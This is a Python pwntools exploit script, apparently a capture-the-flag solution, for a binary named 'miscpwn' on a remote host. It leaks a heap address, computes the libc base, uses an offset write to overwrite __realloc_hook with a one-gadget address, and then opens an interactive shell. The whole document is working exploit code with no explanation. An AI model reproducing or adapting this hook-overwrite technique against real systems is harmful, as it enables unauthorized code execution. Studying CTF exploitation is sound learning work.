#!/usr/bin/env python2

from pwn import *

elf = ELF('./miscpwn')
libc = ELF('./libc.so.6')

HOST, PORT = '51.158.118.84', 17004

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process('./miscpwn')
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

context.terminal = ['tmux', 'new-window']
p = start()
if args.GDB:
	debug([0x13b9])

p.recv()
p.sendline('10000000')
p.recvline()

leak = int(p.recvline().strip(), 16)
libc.address = leak + 0x989ff0
malloc_hook = libc.sym['__realloc_hook']
hook_offset = malloc_hook - leak

log.info('Chunk: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('__malloc_hook: ' + hex(malloc_hook))
log.info('Offset: ' + hex(hook_offset))

p.recv()
p.sendline(hex(hook_offset))

p.recv()
p.send(p64(libc.address + 0x501e3) + p64(libc.sym['realloc'] + 14))

p.interactive()
